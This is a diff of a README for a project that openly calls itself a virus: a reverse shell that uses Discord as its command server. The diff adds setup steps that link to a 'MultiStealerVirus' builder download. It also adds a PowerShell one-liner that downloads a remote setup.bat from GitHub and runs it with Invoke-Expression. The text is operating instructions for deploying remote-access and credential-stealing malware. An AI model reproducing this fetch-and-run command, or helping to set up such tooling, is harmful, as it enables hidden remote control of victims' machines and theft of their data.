@@ -16,14 +16,12 @@ Virus in style of reverse shell whit discord as server
   <img alt="issue" src="https://github.com/Josakko/DiscordReverseShell/blob/main/img/img1.png?raw=true" width="500px">
 </p>
 
-
-
-
 ## Usage
 
 1. Download builder [here](https://github.com/Josakko/MultiStealerVirus/releases/).
 
-2. 
+2. Setup environment:
+  Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/setup.bat" -UseBasicParsing).Content
 
 ## Need Help?
 
